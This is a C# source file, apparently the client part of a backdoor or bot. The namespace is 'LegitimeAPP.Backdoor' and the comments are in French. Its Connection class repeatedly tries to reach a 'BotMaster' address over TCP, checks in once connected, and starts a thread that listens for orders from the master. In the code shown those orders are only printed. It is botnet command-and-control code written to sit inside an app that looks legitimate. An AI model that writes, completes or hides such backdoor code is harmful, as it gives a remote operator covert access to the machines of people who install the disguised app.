
using System ;
using System.Net ;
using System.Net.Sockets ;
using System.Threading;
using System.Text;
using System.IO;
using System.Collections;
using System.Collections.Generic ;
using System.Xml;
using System.Xml.Serialization;

namespace LegitimeAPP.Backdoor {
    public class Connection {

        private IPAddress _masterIP ;
        private int _masterPort ;

        private Stream stm ; 

        // Thread 
        private Thread _FollowingOrders ;
        private Thread _ConnectionRequests ;

        private ASCIIEncoding enc = new ASCIIEncoding() ; 
 


        public Connection(string masterIP, int masterPort) {


            enc = new ASCIIEncoding() ;

            _masterIP = IPAddress.Parse(masterIP) ;
            _masterPort = masterPort ;

            _ConnectionRequests = new Thread(MakeConnectionRequest) ;
            _ConnectionRequests.Name = "Requête de connexion " ;

            _FollowingOrders = new Thread(ListeningOrder) ;
            _FollowingOrders.Name = "" ;

            _ConnectionRequests.Start() ; 
             
        }


        /*

        Ecriture et lecture des messages envoyés et reçu par le serveur 

        */
        private string GetIncomingMessage() {
            byte[] responseRaw = new byte[100] ;
            string response = "" ; 
            int sizeResponse = stm.Read(responseRaw,0,100) ;
            for (int i = 0 ; i < sizeResponse ; i++) {
                response += Convert.ToChar(responseRaw[i]);
            }
            return response ;  
        }

        private void WriteNetMessage(string message) {
            stm.Write(enc.GetBytes(message)) ;
        }

        private void ListeningOrder() {
            while(true) {
                string message = GetIncomingMessage() ;

                Console.WriteLine(message) ;  

            }
        }

        private void MakeConnectionRequest() {

            while (true) {
            TcpClient tcp = new TcpClient() ;
            try {
                // Tentative de connexion au BotMaster 

                tcp.Connect(_masterIP, _masterPort) ;
                stm = tcp.GetStream() ;

                WriteNetMessage("1") ; 

                // On démarre le Thread lorsque la connexion est une réussite 
                
                _FollowingOrders.Start() ; 

                break ; 
                
            } catch( Exception _) {
                Console.WriteLine("La connexion au BotMaster à échoué... Nouvelle tentative dans 5 secondes  ") ;
                }
                Thread.Sleep(5000) ;  
            }
        }
    }
}